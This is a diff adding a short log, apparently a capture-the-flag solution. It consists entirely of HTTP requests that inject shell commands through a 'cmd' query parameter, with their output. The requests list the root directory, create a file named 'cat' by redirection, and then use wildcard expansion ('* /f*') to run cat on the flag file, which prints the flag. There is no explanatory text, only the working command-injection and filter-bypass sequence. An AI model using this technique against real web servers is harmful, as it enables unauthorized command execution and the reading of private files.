@@ -1,0 +1,12 @@
+GET /?cmd=ls+/
+	bin
+	dev
+	etc
+	flag.txt
+	...
+
+GET /?cmd=>cat
+GET /?cmd=ls
+	cat
+GET /?cmd=*+/f*
+	flag{ju57_g0tt@_5pl1t_Em3012}
